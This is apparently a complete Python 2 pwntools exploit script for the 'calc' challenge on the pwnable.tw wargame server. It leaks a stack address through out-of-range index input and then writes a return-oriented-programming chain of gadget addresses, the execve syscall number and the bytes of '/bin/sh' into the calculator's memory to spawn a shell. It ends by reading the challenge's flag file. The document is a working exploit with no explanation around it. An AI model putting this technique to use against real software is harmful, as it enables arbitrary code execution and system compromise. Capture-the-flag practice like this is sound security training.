from pwn import *

addrs = ['+361', '+362', '+363', '+364', 
         '+365', '+366', '+367', '+368', '+369']

payloads = [0x0805c34b, 0x0000000b, 0x080701d0, 0x00000000, 
            0x00000000, 0x00000000, 0x08049a21, 0x6e69622f, 0x0068732f]

def leak_stack(p):
    p.recv(1024)
    p.send('+360\n')
    prev_ebp = int(p.recv(1024))
    payloads[5] = prev_ebp         # dynamically update addr of /bin/sh

def rop(s):
    for i in range(len(payloads)):
        print '[!] target: %s' % hex(payloads[i])
        s.send(addrs[i]+'\n')
        mleak = int(s.recv(1024))
        print '[!] leak: %s' % hex(mleak)
        offset = payloads[i]-mleak
        print '[!] offset: %d' % offset
        g = '%s%+d\n' % (addrs[i], offset)
        print '[+] send: %s' % g
        s.send(g)
        print '==> %s\n=================' % hex(int(s.recv(1024)))
    s.send('\n')


p = remote('chall.pwnable.tw', 10100)
leak_stack(p)
rop(p)

p.send('\n')
p.send('cat /home/calc/flag\n')
print p.recv(1024)
p.close()